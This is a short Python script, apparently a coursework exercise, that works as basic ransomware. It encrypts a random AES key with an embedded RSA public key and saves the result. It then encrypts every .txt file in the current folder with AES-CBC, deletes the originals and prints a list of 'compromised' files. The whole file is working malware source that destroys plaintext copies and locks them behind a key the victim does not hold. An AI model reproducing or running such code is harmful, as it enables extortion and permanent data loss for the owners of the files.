import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA



# a & b.
public_key_content = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAstraGV3tuedd+jDtpvJI\neSm3YkTFv4nocSlZuKAcTTPT4rUYInPPYW2TomatNr/D++JsEnNhaQgHcg+QOVYq\nrzI8WWquOnDmP7I4IHxCnUdDMD0/KD7X7hqJ5xvcnyf7R7rhINgY4ZkiF5kzSsfT\nPCC/snv99OdmfXyakBclorvRKZWz3d1wQLX9rqON1yNkTvnZF4A6c6iIFF2chLZx\n9MUu6E73dLlJm9YXp0OoS82atBf2IoO/y9/p0j2QnwKKJvu4GmfHHsuLSnFcEgyF\nKX9XQfKFgoQ+RfcsbC+v8i6rco4soK2nJKrMC1YusYZjfZtEwM2Iw5dYCCreUtKa\nFQIDAQAB\n-----END PUBLIC KEY-----'
shared_key = get_random_bytes(16)



#c.
def generate_encrypted_shared_key(public_key_content, shared_key):
    public_key = RSA.import_key(public_key_content)
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_shared_key = cipher_rsa.encrypt(shared_key)

    with open("EncryptedSharedKey", "wb") as result_file:
        result_file.write(encrypted_shared_key)
    return 



# d.
def encrypt(file, shared_key):
    with open(file, "rb") as to_be_encrypted:
        to_be_encrypted_content = to_be_encrypted.read()

    cipher = AES.new(shared_key, AES.MODE_CBC)
    encrypted_content = cipher.encrypt(pad(to_be_encrypted_content, AES.block_size))

    with open(f"{file}.encrypted", "wb") as encrypted:
        encrypted.write(cipher.iv + encrypted_content)

    os.remove(file)
    return f"{file}.encrypted"



def encrypt_walk(shared_key):
    compromised_files = []
    current_folder = os.getcwd()
    dir_list = os.listdir(current_folder)
    for file in dir_list:
        path = os.path.join(current_folder, file)
        if os.path.isfile(path) and file.endswith(".txt"):
            try:
                compromised = encrypt(file, shared_key)
                compromised_files.append(path)
            except:
                print(f"An error occured encrypting file: {file}\n")

    return compromised_files



# run
generate_encrypted_shared_key(public_key_content, shared_key)
sol = encrypt_walk(shared_key)
print(sol)
